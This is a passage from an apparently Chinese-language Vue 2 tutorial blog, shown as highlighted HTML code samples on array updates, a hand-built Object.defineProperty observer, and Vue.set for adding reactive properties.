class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>更新时的一个问题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateMei&quot;</span>&gt;</span>更新马冬梅的信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) of persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">persons</span>:[</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">30</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">31</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">updateMei</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// this.persons[0].name = &#x27;马老师&#x27; //奏效</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// this.persons[0].age = 50 //奏效</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// this.persons[0].sex = &#x27;男&#x27; //奏效</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// this.persons[0] = &#123;id:&#x27;001&#x27;,name:&#x27;马老师&#x27;,age:50,sex:&#x27;男&#x27;&#125; //不奏效</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.persons.splice(<span class="number">0</span>,<span class="number">1</span>,&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马老师&#x27;</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;) </span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="Vue检测数据更新的原理"><a href="#Vue检测数据更新的原理" class="headerlink" title="Vue检测数据更新的原理"></a>Vue检测数据更新的原理</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue监测数据改变的原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">student</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;tom&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">age</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">rAge</span>:<span class="number">40</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">sAge</span>:<span class="number">29</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">friends</span>:[</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">name</span>:<span class="string">&#x27;jerry&#x27;</span>,<span class="attr">age</span>:<span class="number">35</span>&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="模拟一个数据监测"><a href="#模拟一个数据监测" class="headerlink" title="模拟一个数据监测"></a>模拟一个数据监测</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> &gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">let</span> data = &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//创建一个监视的实例对象，用于监视data中属性的变化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> obs = <span class="keyword">new</span> Observer(data)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(obs)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//准备一个vm实例对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">let</span> vm = &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">vm._data = data = obs</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="keyword">function</span> <span class="title">Observer</span>(<span class="params">obj</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//汇总对象中所有的属性形成一个数组</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//遍历</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">keys.forEach(<span class="function">(<span class="params">k</span>)=&gt;</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">Object</span>.defineProperty(<span class="built_in">this</span>,k,&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> obj[k]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">set</span>(<span class="params">val</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;k&#125;</span>被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">obj[k] = val</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="Vue中的set方法"><a href="#Vue中的set方法" class="headerlink" title="Vue中的set方法"></a>Vue中的set方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue监测数据改变的原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;school.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;school.address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>校长是：&#123;&#123;school.leader&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加一个性别属性，默认值是男<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：真实&#123;&#123;student.age.rAge&#125;&#125;，对外&#123;&#123;student.age.sAge&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>朋友们<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(f,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;f.name&#125;&#125;--&#123;&#123;f.age&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">school</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">student</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;tom&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">age</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">rAge</span>:<span class="number">40</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">sAge</span>:<span class="number">29</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">friends</span>:[</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">name</span>:<span class="string">&#x27;jerry&#x27;</span>,<span class="attr">age</span>:<span class="number">35</span>&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">name</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="attr">age</span>:<span class="number">36</span>&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="数组更新原理"><a href="#数组更新原理" class="headerlink" title="数组更新原理"></a>数组更新原理</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue监测数据改变的原理_数组<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span 